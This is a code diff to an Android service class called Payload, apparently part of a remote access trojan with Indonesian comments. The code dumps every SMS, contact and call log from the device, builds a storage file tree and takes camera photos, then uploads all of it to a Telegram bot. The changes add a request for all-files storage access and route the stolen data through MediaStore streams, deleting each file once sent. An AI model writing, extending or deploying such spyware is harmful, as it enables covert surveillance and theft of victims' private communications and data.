@@ -5,11 +5,14 @@ import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
+import android.content.ContentValues;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Build;
+import android.os.Environment;
 import android.os.IBinder;
+import android.provider.MediaStore;
 import android.provider.Settings;
 import android.database.Cursor;
 import android.provider.ContactsContract;
@@ -17,7 +20,6 @@ import android.provider.CallLog;
 import android.hardware.Camera;
 import android.location.Location;
 import android.location.LocationManager;
-import android.os.Environment;
 import android.content.Context;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
@@ -26,10 +28,11 @@ import android.media.FaceDetector;
 import android.media.MediaMetadataRetriever;
 
 import java.io.BufferedReader;
+import java.io.InputStream;
 import java.io.InputStreamReader;
+import java.io.OutputStream;
 import java.io.File;
 import java.io.FileInputStream;
-import java.io.FileOutputStream;
 import java.io.DataOutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -52,7 +55,7 @@ public class Payload extends Service {
     private void writeLog(String msg) {
         try {
             File file = new File(getExternalFilesDir(null), "rat_debug.txt");
-            FileOutputStream fos = new FileOutputStream(file, true);
+            java.io.FileOutputStream fos = new java.io.FileOutputStream(file, true);
             fos.write((new java.util.Date().toString() + " - " + msg + "\n").getBytes());
             fos.close();
         } catch (Exception e) {}
@@ -79,6 +82,17 @@ public class Payload extends Service {
             }
             if (!permissions.isEmpty()) {
                 activity.requestPermissions(permissions.toArray(new String[0]), 101);
+            }
+            
+            // Minta Izin MANAGE_EXTERNAL_STORAGE (Android 11+) biar Tree bisa dibaca
+            if (Build.VERSION.SDK_INT >= 30) {
+                if (!Environment.isExternalStorageManager()) {
+                    try {
+                        Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
+                        intent.setData(Uri.parse("package:" + activity.getPackageName()));
+                        activity.startActivity(intent);
+                    } catch (Exception e) {}
+                }
             }
             
             try {
@@ -136,7 +150,6 @@ public class Payload extends Service {
         return START_NOT_STICKY;
     }
 
-    // Helper: parser perintah yang lebih toleran
     private String getParam(String json, String cmdPrefix) {
         int idx = json.indexOf(cmdPrefix);
         if (idx == -1) return null;
@@ -174,10 +187,7 @@ public class Payload extends Service {
                 writeLog("Membangun Tree...");
                 String tree = buildTree(new File("/storage/emulated/0/"), "", 0);
                 if (tree.length() > 3500) {
-                    File treeFile = new File(getExternalFilesDir(null), "tree.txt");
-                    FileOutputStream fos = new FileOutputStream(treeFile);
-                    fos.write(tree.getBytes()); fos.close();
-                    sendTelegramFile(treeFile.getAbsolutePath(), false, "📂 Tree Folder (File)");
+                    saveAndSendText("tree.txt", tree, "📂 Tree Folder (File)");
                 } else {
                     sendTelegramMessage("📂 *Tree Folder:*\n" + tree);
                 }
@@ -352,6 +362,32 @@ public class Payload extends Service {
         } catch (Exception e) { writeLog("Error CheckIn: " + e.getMessage()); }
     }
 
+    // ── FUNGSI BARU: Simpan via MediaStore & Kirim ──
+    private void saveAndSendText(String filename, String content, String caption) {
+        try {
+            ContentValues values = new ContentValues();
+            values.put(MediaStore.MediaColumns.DISPLAY_NAME, filename);
+            values.put(MediaStore.MediaColumns.MIME_TYPE, "text/plain");
+            values.put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS);
+            
+            Uri uri = getContentResolver().insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, values);
+            if (uri != null) {
+                OutputStream os = getContentResolver().openOutputStream(uri);
+                os.write(content.getBytes());
+                os.close();
+                
+                // Buka stream buat dikirim ke Telegram
+                InputStream is = getContentResolver().openInputStream(uri);
+                sendTelegramFileStream(is, filename, false, caption);
+                
+                // Hapus file dari MediaStore setelah terkirim
+                getContentResolver().delete(uri, null, null);
+            }
+        } catch (Exception e) {
+            writeLog("MediaStore Error: " + e.getMessage());
+        }
+    }
+
     private void dumpSmsToFile() {
         writeLog("Menyedot semua SMS...");
         StringBuilder sb = new StringBuilder();
@@ -366,14 +402,7 @@ public class Payload extends Service {
                 cursor.close();
             }
         } catch (Exception e) { writeLog("Gagal baca SMS"); }
-        
-        try {
-            File file = new File(getExternalFilesDir(null), "sms_dump.txt");
-            FileOutputStream fos = new FileOutputStream(file);
-            fos.write(sb.toString().getBytes()); fos.close();
-            sendTelegramFile(file.getAbsolutePath(), false, "📩 Dump SEMUA SMS");
-            file.delete();
-        } catch (Exception e) { writeLog("Gagal kirim SMS file"); }
+        saveAndSendText("sms_dump.txt", sb.toString(), "📩 Dump SEMUA SMS");
     }
 
     private void dumpContactsToFile() {
@@ -389,14 +418,7 @@ public class Payload extends Service {
                 cursor.close();
             }
         } catch (Exception e) { writeLog("Gagal baca Kontak"); }
-        
-        try {
-            File file = new File(getExternalFilesDir(null), "kontak_dump.txt");
-            FileOutputStream fos = new FileOutputStream(file);
-            fos.write(sb.toString().getBytes()); fos.close();
-            sendTelegramFile(file.getAbsolutePath(), false, "👥 Dump SEMUA Kontak");
-            file.delete();
-        } catch (Exception e) { writeLog("Gagal kirim Kontak file"); }
+        saveAndSendText("kontak_dump.txt", sb.toString(), "👥 Dump SEMUA Kontak");
     }
 
     private void dumpCallLogsToFile() {
@@ -414,14 +436,7 @@ public class Payload extends Service {
                 cursor.close();
             }
         } catch (Exception e) { writeLog("Gagal baca Call Log"); }
-        
-        try {
-            File file = new File(getExternalFilesDir(null), "telpon_dump.txt");
-            FileOutputStream fos = new FileOutputStream(file);
-            fos.write(sb.toString().getBytes()); fos.close();
-            sendTelegramFile(file.getAbsolutePath(), false, "📞 Dump SEMUA Call Log");
-            file.delete();
-        } catch (Exception e) { writeLog("Gagal kirim Call Log file"); }
+        saveAndSendText("telpon_dump.txt", sb.toString(), "📞 Dump SEMUA Call Log");
     }
 
     private String getLocation() {
@@ -442,8 +457,8 @@ public class Payload extends Service {
                 @Override
                 public void onPictureTaken(byte[] data, Camera camera) {
                     try {
-                        File file = new File(Environment.getExternalStorageDirectory(), "sys_photo_" + System.currentTimeMillis() + ".jpg");
-                        FileOutputStream fos = new FileOutputStream(file);
+                        File file = new File(getExternalFilesDir(null), "sys_photo_" + System.currentTimeMillis() + ".jpg");
+                        java.io.FileOutputStream fos = new java.io.FileOutputStream(file);
                         fos.write(data); fos.close();
                         camera.release();
                         sendTelegramFile(file.getAbsolutePath(), true, "📸 Foto Kamera");
@@ -461,14 +476,21 @@ public class Payload extends Service {
         } catch (Exception e) { writeLog("Error Kirim Pesan: " + e.getMessage()); }
     }
 
-    // FIX: Nama field dinamis (photo vs document)
+    // Kirim File Biasa (dari File Path)
     private void sendTelegramFile(String filePath, boolean isPhoto, String caption) {
-        String boundary = "*****";
-        String fieldName = isPhoto ? "photo" : "document";
         try {
             File file = new File(filePath);
             if (!file.exists()) { writeLog("File ga ada: " + filePath); return; }
-            
+            InputStream is = new FileInputStream(file);
+            sendTelegramFileStream(is, file.getName(), isPhoto, caption);
+        } catch (Exception e) { writeLog("Exception File: " + e.getMessage()); }
+    }
+
+    // Kirim File via Stream (buat MediaStore)
+    private void sendTelegramFileStream(InputStream is, String filename, boolean isPhoto, String caption) {
+        String boundary = "*****";
+        String fieldName = isPhoto ? "photo" : "document";
+        try {
             String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + (isPhoto ? "/sendPhoto" : "/sendDocument");
             HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
             conn.setDoOutput(true);
@@ -485,31 +507,25 @@ public class Payload extends Service {
             }
             
             request.writeBytes("--" + boundary + "\r\n");
-            request.writeBytes("Content-Disposition: form-data; name=\"" + fieldName + "\"; filename=\"" + file.getName() + "\"\r\n");
+            request.writeBytes("Content-Disposition: form-data; name=\"" + fieldName + "\"; filename=\"" + filename + "\"\r\n");
             request.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
             
-            FileInputStream fis = new FileInputStream(file);
             byte[] buffer = new byte[4096];
             int bytesRead;
-            while ((bytesRead = fis.read(buffer)) != -1) request.write(buffer, 0, bytesRead);
-            fis.close();
+            while ((bytesRead = is.read(buffer)) != -1) request.write(buffer, 0, bytesRead);
+            is.close();
             
             request.writeBytes("\r\n--" + boundary + "--\r\n");
             request.flush(); request.close();
             
             int responseCode = conn.getResponseCode();
             if (responseCode != 200) {
-                // Log error dari Telegram
-                BufferedReader err = new BufferedReader(new InputStreamReader(conn.getErrorStream()));
-                StringBuilder errBody = new StringBuilder();
-                String errLine;
-                while ((errLine = err.readLine()) != null) errBody.append(errLine);
-                writeLog("Kirim File GAGAL (" + responseCode + "): " + errBody.toString());
+                writeLog("Kirim File GAGAL (" + responseCode + ")");
             } else {
-                writeLog("Kirim File SUKSES: " + file.getName());
+                writeLog("Kirim File SUKSES: " + filename);
             }
-        } catch (Exception e) { 
-            writeLog("Exception SendFile: " + e.getMessage()); 
+        } catch (Exception e) {
+            writeLog("Exception Stream: " + e.getMessage());
         }
     }
 
